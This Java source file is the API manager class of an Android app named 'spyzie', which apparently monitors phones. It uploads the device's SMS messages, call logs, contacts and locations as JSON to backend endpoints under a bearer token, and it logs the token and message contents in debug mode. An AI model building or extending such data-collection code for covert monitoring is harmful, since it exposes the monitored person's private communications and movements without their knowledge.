package com.tantd.spyzie.data.network;

import android.content.Context;
import android.util.Log;

import com.androidnetworking.common.Priority;
import com.rx2androidnetworking.Rx2AndroidNetworking;
import com.tantd.spyzie.SpyzieApplication;
import com.tantd.spyzie.data.model.AccessTokenResponse;
import com.tantd.spyzie.data.model.Call;
import com.tantd.spyzie.data.model.CommonResponse;
import com.tantd.spyzie.data.model.Contact;
import com.tantd.spyzie.data.model.DataType;
import com.tantd.spyzie.data.model.Error;
import com.tantd.spyzie.data.model.Event;
import com.tantd.spyzie.data.model.Location;
import com.tantd.spyzie.data.model.LoginRequest;
import com.tantd.spyzie.data.model.Sms;
import com.tantd.spyzie.util.Constants;
import com.tantd.spyzie.util.JsonUtil;

import org.json.JSONArray;

import java.util.List;

import io.reactivex.Single;

/**
 * Created by tantd on 8/21/2017.
 */
public class AppApiManager implements ApiManager {

    private Context mContext;

    private static final String DEBUG_SUB_TAG = "[" + AppApiManager.class.getSimpleName() + "] ";

    private static AppApiManager instance;

    private AccessTokenResponse accessToken;

    public static synchronized AppApiManager getInstance() {
        if (instance == null) {
            instance = new AppApiManager();
        }
        return instance;
    }

    private AppApiManager() {
        mContext = SpyzieApplication.getInstance();
    }

    @Override
    public Single<List<Event>> getSchedules() {
        return Rx2AndroidNetworking.get(ApiEndPoint.ENDPOINT_SCHEDULES)
                .build().getObjectListSingle(Event.class);
    }

    @Override
    public Single<AccessTokenResponse> login(LoginRequest request) {
        return Rx2AndroidNetworking.post(ApiEndPoint.LOGIN).addBodyParameter(request)
                .setPriority(Priority.MEDIUM)
                .addHeaders("Accept", "application/json")
                .addHeaders("Content-Type", "application/json")
                .build().getObjectSingle(AccessTokenResponse.class);
    }

    @Override
    public void storeAccessToken(AccessTokenResponse accessToken) {
        this.accessToken = accessToken;
        if (Constants.IS_DEBUG_MODE) {
            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "storeAccessToken, accessToken=" + this.accessToken);
        }
    }

    @Override
    public AccessTokenResponse getAccessToken() {
        return accessToken;
    }

    @Override
    public Single<CommonResponse> sendLocationData(Location location) {
        if (Constants.IS_DEBUG_MODE) {
            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "sendLocationData, lat=" + location.lat + ", lon=" + location.lon);
        }
        return null;
    }

    @Override
    public Single<CommonResponse> sendLocationData(List<Location> locations) {
        if (Constants.IS_DEBUG_MODE) {
            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "sendLocationData, size=" + locations.size());
        }
        return sendData(locations, DataType.LOCATION);
    }

    @Override
    public Single<CommonResponse> sendSmsData(Sms sms) {
        if (Constants.IS_DEBUG_MODE) {
            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "sendSmsData: " + sms.toString());
        }
        // TODO: implement here
        return null;
    }

    @Override
    public Single<CommonResponse> sendSmsData(List<Sms> sms) {
        if (Constants.IS_DEBUG_MODE) {
            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "sendSmsData, size=" + sms.size());
        }
        return sendData(sms, DataType.SMS);
    }

    @Override
    public Single<CommonResponse> sendContactsData(List<Contact> contacts) {
        if (Constants.IS_DEBUG_MODE) {
            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "sendContactsData, size=" + contacts.size());
        }
        return sendData(contacts, DataType.CONTACT);
    }

    @Override
    public Single<CommonResponse> sendCallsData(List<Call> calls) {
        if (Constants.IS_DEBUG_MODE) {
            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "sendCallsData, size=" + calls.size());
        }
        return sendData(calls, DataType.CALL);
    }

    private Single<CommonResponse> sendData(List<?> objects, DataType type) {
        JSONArray jsonArray = JsonUtil.getInstance().toJsonArray(objects);
        if (Constants.IS_DEBUG_MODE) {
            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "sendData, jsonArray=" + jsonArray);
        }
        if (Constants.IS_API_ACIVE) {
            String url = null;
            switch (type) {
                case CONTACT:
                    url = ApiEndPoint.CONTACT;
                    break;
                case CALL:
                    url = ApiEndPoint.CALL;
                    break;
                case SMS:
                    url = ApiEndPoint.SMS;
                    break;
                case LOCATION:
                    url = ApiEndPoint.LOCATION;
                    break;
                case ERROR_TRACKING:
                    url = ApiEndPoint.ERROR_TRACKING;
                    break;
            }
            return Rx2AndroidNetworking.post(url).addJSONArrayBody(jsonArray)
                    .setPriority(Priority.MEDIUM)
                    .addHeaders("Accept", "application/json")
                    .addHeaders("Content-Type", "application/json")
                    .addHeaders("Authorization", "Bearer " + getAccessToken().getToken())
                    .build().getObjectSingle(CommonResponse.class);
        } else {
            return null;
        }
    }

    @Override
    public Single<CommonResponse> sendExceptionTracking(Error error) {
        if (Constants.IS_DEBUG_MODE) {
            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "sendExceptionTracking, error=" + error + ", errorValue=" + error.ordinal());
        }
        // TODO: implement here
        return null;
    }

    @Override
    public Single<AccessTokenResponse> refreshAccessToken() {
        return Rx2AndroidNetworking.get(ApiEndPoint.REFRESH_TOKEN)
                .setPriority(Priority.MEDIUM)
                .addHeaders("Authorization", "Bearer " + getAccessToken().getToken())
                .build().getObjectSingle(AccessTokenResponse.class);
    }

    private <T> void print(List<T> objects) {
        for (T t :
                objects) {
            if (Constants.IS_DEBUG_MODE) {
                Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + t);
            }
        }
    }
}
